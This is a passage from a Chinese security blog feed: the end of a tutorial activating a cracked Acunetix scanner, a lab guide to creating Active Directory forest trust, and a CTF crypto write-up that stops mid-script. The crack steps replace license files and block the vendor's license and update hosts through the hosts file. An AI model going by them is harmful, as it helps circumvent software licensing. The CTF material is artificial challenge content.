<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">/</span>home<span class="token operator">/</span>acunetix<span class="token operator">/</span><span class="token punctuation">.</span>acunetix<span class="token operator">/</span>data<span class="token operator">/</span>license<span class="token operator">/</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115151753513.png" alt="image-20220115151753513" /></p>
<p>全部替换即可</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115151838013.png" alt="image-20220115151838013" /></p>
<p>[6] 打开 hosts 文件，添加如下两行到 hosts 文件中</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> updates<span class="token punctuation">.</span>acunetix<span class="token punctuation">.</span>com</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> erp<span class="token punctuation">.</span>acunetix<span class="token punctuation">.</span>com</pre></td></tr></table></figure><p>hosts 文件在 /etc/ 目录下</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115151945326.png" alt="image-20220115151945326" /></p>
<p>修改完后如图</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115152055839.png" alt="image-20220115152055839" /></p>
<p>[7] 返回网页刷新即可看到激活成功</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115152230085.png" alt="image-20220115152230085" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115152215067.png" alt="image-20220115152215067" /></p>
<h2 id="注意事项"><a class="anchor" href="#注意事项">#</a> 注意事项</h2>
<p><code>该工具仅可用于研究使用,切勿用于非法犯罪活动,未经双方同意使用此工具攻击目标是非法的.</code> <br />
 <code>工具安全性自测,For your safety请放虚拟机运行</code></p>
<h3 id="参考链接"><a class="anchor" href="#参考链接">#</a> 参考链接</h3>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGRvc2kub3JnL2F3dnMtMTQtNS0yLyMlRTUlQUUlODklRTglQTMlODUlRTUlOEMlODUlRTQlQjglOEIlRTglQkQlQkQ=">Awvs 破解版 14.5.211115146 Windows+Linux+Mac cracked</span></p>
]]></content>
      <categories>
        <category>STools</category>
      </categories>
      <tags>
        <tag>STools</tag>
      </tags>
  </entry>
  <entry>
    <title>Active Directory域服务：域信任</title>
    <url>/article/1df695da.html</url>
    <content><![CDATA[<h2 id="active-directory简介"><a class="anchor" href="#active-directory简介">#</a> Active Directory 简介</h2>
<p><code>Active Directory</code>  中文意思为活动目录， <code>Active Directory</code>  域内的 <code>Directory Database</code> （目录数据库）被用来存储用户账户、计算机账号、打印机域共享文件夹等对象，提供目录服务的组件就是 <code>Active Directory</code>  域服务（ <code>Active Directory Domain Service</code> ， <code>AD DS</code> ）。 <code>AD DS</code>  负责目录数据库的存储、创建、删除、修改、查询等工作。<br />
 <code> Active Directory</code>  存储有关网络上对象的信息，并让管理员和用户可以更容易地使用这些信息。  <code>Active Directory</code>  使用结构化数据存储作为目录信息的逻辑层次组织的基础。</p>
<h2 id="信任trust"><a class="anchor" href="#信任trust">#</a> 信任（Trust）</h2>
<p>两个域之间必须拥有信任关系（ <code>Trust Relationship</code> ），才可以访问对方域内的资源。而任何一个新的 <code>AD DS</code>  域被加入到域树后，这个域都会自动信任其上一层的父域，同时父域也会自动信任这个新子域。<br />
一个林中的域之间所有的 <code>Active Directory</code>  信任关系都具备双向传递性（ <code>Two-Way Transitive</code> ）。如图中：域 A 信任域 B，且域 B 信任域 <code>C</code> ，则域 <code>C</code>  中的用户访问域 <code>A</code>  中的资源。（这些用户被分配了访问权限）由于此信任工作是通过 <code>Kerberos security protocol</code>  来完成的，因此也被称为 <code>Kerveros trust</code> 。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211208214045365.png" alt="image-20211208214045365" /></p>
<p>图中域 <code>A</code>  信任域 <code>B</code> 、域 <code>B</code>  又信任域 <code>C</code> 、因此域 <code>A</code>  自动信任域 <code>C</code> ；另外域 <code>C</code>  信任域 <code>B</code> 、域 <code>B</code>  又信任域 <code>A</code> ，因此域 <code>C</code>  自动信任域 <code>A</code> 。结果是域 <code>A</code>  和域 <code>C</code>  之间会自动建立起双向的信任关系。<br />
所以当任何一个新域加入到域树后，都会自动双向信任这个域树内所有的域，只要拥有适当的权限，这个新域内的用户就可以访问其他域内的资源。同理，其他域内的用户也可以访问这个新域内的资源。</p>
<p><strong>信任协议</strong><br />
域控制器使用两种协议对用户和应用程序进行身份验证：<br />
 <code>Kerberos version 5（V5）</code> 或  <code>NTML</code> 。 <code>Kerberos V5</code>  协议是 <code>Active Directory</code>  域中的计算机的默认协议。如果事务中的任何计算机都不支持 <code>Kerberos V5</code>  协议，则使用 <code>NTML</code>  协议。</p>
<p><strong>信任方向</strong></p>
<ul>
<li>单向信任：单向信任是在两个域之间创建的单向身份验证路径。这表示在域 <code>A</code>  和域 <code>B</code>  之间的单向信任中，域 <code>A</code>  中的用户可以访问域 <code>B</code>  中的资源，但是域 <code>B</code>  中的用户无法访问域 <code>A</code>  中的资源。单向信任可以是不可传递，也可以是可传递信任，这取决于创建的信任类型。</li>
<li>双向信任： <code>Active Directory</code>  林中的所有域信任都是双向的、可传递的信任。创建新的子域时，系统将在新的子域和父域之间自动创建双向可传递信任。在双向信任中，域 <code>A</code>  信任域 <code>B</code> ，并且域 <code>B</code>  信任域 <code>A</code> 。这表示可以在两个域之间双向传递身份验证请求。双向关系可以是不可传递的，也可以是可传递的，这取决于所创建的信任类型。</li>
</ul>
<p><strong>信任类型</strong><br />
包括外部信任（不可传递）、快捷方式信任（可传递）、领域信任（可传递或不可传递）、林信任（可传递）。</p>
<h2 id="环境描述"><a class="anchor" href="#环境描述">#</a> 环境描述</h2>
<p>林功能级别是 <code>Windows Server 2003</code></p>
<p>环境配置：</p>
<table>
<thead>
<tr>
<th style="text-align:center">域控</th>
<th style="text-align:center">IP</th>
<th style="text-align:center">DNS 服务器</th>
<th style="text-align:center">子网掩码</th>
<th style="text-align:center">网关</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Windows Server 2012</td>
<td style="text-align:center">10.211.55.20</td>
<td style="text-align:center">10.211.55.20</td>
<td style="text-align:center">255.0.0.0</td>
<td style="text-align:center">10.211.55.1</td>
</tr>
<tr>
<td style="text-align:center">Windows Server 2008</td>
<td style="text-align:center">10.211.55.25</td>
<td style="text-align:center">10.211.55.25</td>
<td style="text-align:center">255.0.0.0</td>
<td style="text-align:center">10.211.55.1</td>
</tr>
</tbody>
</table>
<h2 id="windows-server-2008上部署dc"><a class="anchor" href="#windows-server-2008上部署dc">#</a> Windows Server 2008 上部署 DC</h2>
<p>配置 IP</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211209101732113.png" alt="image-20211209101732113" /></p>
<p>设置本地管理员密码为 <code>21r000@2008</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211209102325890.png" alt="image-20211209102325890" /></p>
<p>按住 <code>Win+R</code>  键，打开运行，并在运行中输入 “ <code>dcpromo</code> ”；</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211209101619671.png" alt="image-20211209101619671" /></p>
<p><code>Active Directory</code>  域服务安装向导自动打开，点击下一步；</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211209101710422.png" alt="image-20211209101710422" /></p>
<p>操作系统兼容性检查，点击下一步；</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211209101721233.png" alt="image-20211209101721233" /></p>
<p>选择在新林中新建域，点击下一步；</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211209102015277.png" alt="image-20211209102015277" /></p>
<p>设定 <code>FQDN</code> ，点击下一步；自动检查新的林名称和 <code>NetBIOS</code>  名称；</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211209102409920.png" alt="image-20211209102409920" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211209102618923.png" alt="image-20211209102618923" /></p>
<p>鉴于网络中尚未部署 <code>DNS</code>  服务器，勾选 <code>DNS</code>  服务器，点击下一步；</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211209102702850.png" alt="image-20211209102702850" /></p>
<p>一路默认，设定目录还原模式密码为 <code>21r000@666</code> ，点击下一步；</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211209102819898.png" alt="image-20211209102819898" /></p>
<p>确认域控制器设置，点击下一步；</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211209102844340.png" alt="image-20211209102844340" /></p>
<p><code>Active Directory</code>  域服务开始自动安装；</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211209102854882.png" alt="image-20211209102854882" /></p>
<p><code>Active Directory</code>  域服务安装向导完成，点击完成；</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211191852755.png" alt="image-20211211191852755" /></p>
<p>提示重启计算机，根据需要选择稍后重启，或者立即重启。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211209103040134.png" alt="image-20211209103040134" /></p>
<h2 id="创建信任"><a class="anchor" href="#创建信任">#</a> 创建信任</h2>
<p>两个域之间创建信任很简单，麻烦的是怎么才能让两个域都能互相解析到，方法有很多种，比如，创建辅助区域、创建反向查找区域等等，这里使用的是创建辅助区域。</p>
<h3 id="建立dns辅助区域"><a class="anchor" href="#建立dns辅助区域">#</a> 建立 DNS 辅助区域</h3>
<p>1、在 <code>21r000.org</code>  的这台域控制器上面，在 <code>DNS</code>  页面右键打开 <code>DNS</code>  管理器</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211209090449963.png" alt="image-20211209090449963" /></p>
<p>在 <code>DNS</code>  管理器页面选中域名，右键打开‘属性’</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211209090910600.png" alt="image-20211209090910600" /></p>
<p>选择 “区域传送” 对话框，勾选 “允许区域传送” 并选择 “只允许到下列服务器”，然后选择 “编辑” 并添加 <code>21r000.local</code>  这台域控制器的 <code>DNS</code>  地址；然后选择 “确定”；</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211209103340566.png" alt="image-20211209103340566" /></p>
<p>然后登录到 <code>21r000.local</code>  域服务器，转到 <code>DNS</code>  服务器</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211209104029283.png" alt="image-20211209104029283" /></p>
<p>找到 <code>dns</code>  配置后右键打开属性面板</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211209104123860.png" alt="image-20211209104123860" /></p>
<p>同样在 <code>DNS</code>  的转发器面板中建立到 <code>21r000.org</code>  的区域传送。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211209104233354.png" alt="image-20211209104233354" /></p>
<p>在接口面板选择 “只在下列 <code>IP</code>  地址”</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211209104335901.png" alt="image-20211209104335901" /></p>
<p>回到 <code>21r000.org</code> ，在 <code>DNS</code>  正向查找区域新建区域。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211209091736921.png" alt="image-20211209091736921" /></p>
<p>新建区域向导选择辅助区域。下一步。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211209091801970.png" alt="image-20211209091801970" /></p>
<p>输入 <code>21r000.local</code>  的区域名称</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211209091827165.png" alt="image-20211209091827165" /></p>
<p>在主 <code>DNS</code>  服务器中添加 <code>21r000.local</code>  的服务器地址。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211209104441805.png" alt="image-20211209104441805" /></p>
<p>完成区域向导建立</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211209092003104.png" alt="image-20211209092003104" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211209092146917.png" alt="image-20211209092146917" /></p>
<p>在 <code>21r000.local</code>  域中用同样的方法建立 <code>21r000.org</code>  的辅助区域。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211193415181.png" alt="image-20211211193415181" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211209104602928.png" alt="image-20211209104602928" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211209104626365.png" alt="image-20211209104626365" /></p>
<p>创建完成后可以通过 “ <code>nslookup</code> ” 看能否互相解析到；</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211193516199.png" alt="image-20211211193516199" /></p>
<p>如果有问题，可以先尝试：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Ipconfig <span class="token operator">/</span>flushdns      #清除<span class="token constant">DNS</span>缓存</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>ipconfig <span class="token operator">/</span>registerdns     #刷新所有dhcp租约，并重新注册<span class="token constant">DNS</span>名称</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>Net stop netlogon         #停止netlogon</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>Net start netlogon         #启动netlogon</pre></td></tr></table></figure><h3 id="建立林信任关系"><a class="anchor" href="#建立林信任关系">#</a> 建立林信任关系</h3>
<p>创建好辅助区域后，下面就应该创建信任了：</p>
<p>1.1、登录 <code>21r000.local</code> , 打开 <code>active directory</code>  域和信任关系，打开域的属性。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211209104803764.png" alt="image-20211209104803764" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211209104828311.png" alt="image-20211209104828311" /></p>
<p>1.2、选择 “信任” 对话框，并选择 “新建信任”；</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211204048015.png" alt="image-20211211204048015" /></p>
<p>打开 “新建域信任向导”，选择 “下一步”；</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211209111940199.png" alt="image-20211209111940199" /></p>
<p>1.3、输入加入信任域的名称，然后选择 “下一步”；</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211209111956702.png" alt="image-20211209111956702" /></p>
<p>1.4、在 “信任传递” 选择 “可传递”，然后选择 “下一步”；</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211193913527.png" alt="image-20211211193913527" /></p>
<p>1.5、在 “信任方向” 选择 “双向”，然后选择 “下一步”；</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211194015897.png" alt="image-20211211194015897" /></p>
<p>1.6、在 “信任密码” 输入 <code>21r000@555</code> ，然后选择 “下一步”；</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211194126475.png" alt="image-20211211194126475" /></p>
<p>1.7、完成建立信任向导</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211194143987.png" alt="image-20211211194143987" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211194222056.png" alt="image-20211211194222056" /></p>
<p>可以看到信任类型。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211194236207.png" alt="image-20211211194236207" /></p>
<p>2.1、在 <code>21r000.org</code>  中同样建立信任关系</p>
<p>2.2、在 “工具” 选择 “ <code>active directory</code>  域和信任关系”</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211195419983.png" alt="image-20211211195419983" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211195632992.png" alt="image-20211211195632992" /></p>
<p>2.3、在 “信任名称” 输入 <code>21r000.local</code> ，然后选择 “下一步”；</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211200322521.png" alt="image-20211211200322521" /></p>
<p>2.4、在信任方向选择 “双向”，然后选择 “下一步”；</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211209093327671.png" alt="image-20211209093327671" /></p>
<p>2.5、因为在 <code>21r000.local</code>  域中已经建立了信任关系，所以这里在 “信任方” 选择 “只是这个域”，然后选择 “下一步”；（ps: 看大佬博文这里选择 “此域和指定的域” 卡住了好久！！！）</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211201406849.png" alt="image-20211211201406849" /></p>
<p>2.6、在传出信任身份验证级别窗口选择 “全域身份验证”（一般情况下，我们都会选择 “全局性身份验证”；但如果有不同的需求可以选择下面一个 “选择性身份验证”，每个选项都有相关说明，这里我就不说了。），然后选择 “下一步”；</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211201220236.png" alt="image-20211211201220236" /></p>
<p>2.7、建立信任密码为： <code>21r000@555</code> , 下一步；</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211201254324.png" alt="image-20211211201254324" /></p>
<p>2.8、在 “选择信任完毕” 窗口选择 “下一步”；</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211201606430.png" alt="image-20211211201606430" /></p>
<p>2.9、在 “信任创建完毕” 窗口，选择 “下一步”；</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211201619783.png" alt="image-20211211201619783" /></p>
<p>2.10、在 “确认传出信任” 窗口，选择 “是，确认传出信任” 并选择 “下一步”；</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211201638942.png" alt="image-20211211201638942" /></p>
<p>2.11、在 “确认传入信任” 窗口，选择 “是，确认传入信任” 并选择 “下一步”；</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211201803081.png" alt="image-20211211201803081" /></p>
<p>2.12、在 “正在完成新建信任向导” 窗口，选择 “完成”；</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211201838493.png" alt="image-20211211201838493" /></p>
<p>2.13、在弹出 “ <code>Active Directory</code>  域服务” 选择 “确定”；</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211201854085.png" alt="image-20211211201854085" /></p>
<p>此时，在信任属性窗口中，可以看到，相关域之间的属性；</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211201917383.png" alt="image-20211211201917383" /></p>
<p>到另一个域中打开域信任属性窗口，同样也可以看到两个域之间的信任。</p>
<p>至此，域信任关系建立完毕！！！</p>
<h2 id="感言"><a class="anchor" href="#感言">#</a> 感言：</h2>
<p>yep，卡了好久，果然不是按大佬博文的操作来进行就能完全成功的，还得靠自己，自己动手丰衣足食嘛！！！</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211202159125.png" alt="image-20211211202159125" /></p>
<h3 id="参考链接"><a class="anchor" href="#参考链接">#</a> 参考链接：</h3>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLjUxY3RvLmNvbS95dXBlaXpoaS8xNjk5MDk5">Windows Server 笔记（六）：Active Directory 域服务：域信任</span></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFshow月饼杯Crypto2_月自圆WP</title>
    <url>/article/dcbf7c1a.html</url>
    <content><![CDATA[<p><span class="exturl" data-url="aHR0cHM6Ly9jdGYuc2hvdy9jaGFsbGVuZ2VzI2NyeXB0bzJfJUU2JTlDJTg4JUU4JTg3JUFBJUU1JTlDJTg2LTQ4NA==">题目链接</span></p>
<p>加密脚本 <code>Baby(Don't)Cry.py</code> ：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre># <span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span> coding<span class="token operator">:</span>utf<span class="token operator">-</span><span class="token number">8</span> <span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span></pre></td></tr><tr><td data-num="2"></td><td><pre>#Author<span class="token operator">:</span> Lazzaro</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>from itertools <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="5"></td><td><pre>from random <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="6"></td><td><pre>from string <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>def <span class="token function">encrypt</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> a<span class="token punctuation">,</span> si<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	c<span class="token operator">=</span><span class="token string">""</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>		c<span class="token operator">+=</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> a <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span>si<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">zfill</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token keyword">return</span> c</pre></td></tr><tr><td data-num="13"></td><td><pre>	</pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	m <span class="token operator">=</span> <span class="token string">'****************************************************flag&#123;*************&#125;'</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	<span class="token function">assert</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">71</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>	a <span class="token operator">=</span> <span class="token function">randint</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>	salt <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token function">sample</span><span class="token punctuation">(</span>ascii_uppercase<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	si <span class="token operator">=</span> <span class="token function">cycle</span><span class="token punctuation">(</span>salt<span class="token punctuation">.</span><span class="token function">lower</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	c<span class="token operator">=</span><span class="token function">encrypt</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> a<span class="token punctuation">,</span> si<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	<span class="token function">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	</pre></td></tr><tr><td data-num="23"></td><td><pre>#3472184e657e50561c481f5c1c4e1938163e154431015e13062c1b073d4e3a444f4a5c5c7a071919167b034e1c29566647600c4e1c2956661b6c1f50622f0016317e563546202a</pre></td></tr></table></figure><p>根据加密程序可以知道明文长度为 <code>71</code>  位，加密后为 <code>142</code>  位。<br />
这里由于 a 不大，salt 长度也不长，且明文 m 中存在 flag，正好可以用这几位去爆破出 a 和 salt。<br />
flag 在明文 m 中的位置是 53，对应密文 c 中的位置是 105。flag 出现的位置正好对应 salt 的位置。</p>
<p>爆破 a：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>from random <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre>from string <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="3"></td><td><pre>from itertools <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>def <span class="token function">decrypt</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> a<span class="token punctuation">,</span> si<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	c<span class="token operator">=</span><span class="token string">""</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>		c<span class="token operator">+=</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> a <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span>si<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">zfill</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	<span class="token keyword">return</span> c</pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>		<span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token literal-property property">ascii_uppercase</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="14"></td><td><pre>			si <span class="token operator">=</span> <span class="token function">cycle</span><span class="token punctuation">(</span>j<span class="token punctuation">.</span><span class="token function">lower</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>			# <span class="token keyword">if</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token string">'f'</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> si<span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'1c'</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre>			# 	<span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'i ='</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token string">'\tj ='</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>			<span class="token keyword">if</span> <span class="token function">decrypt</span><span 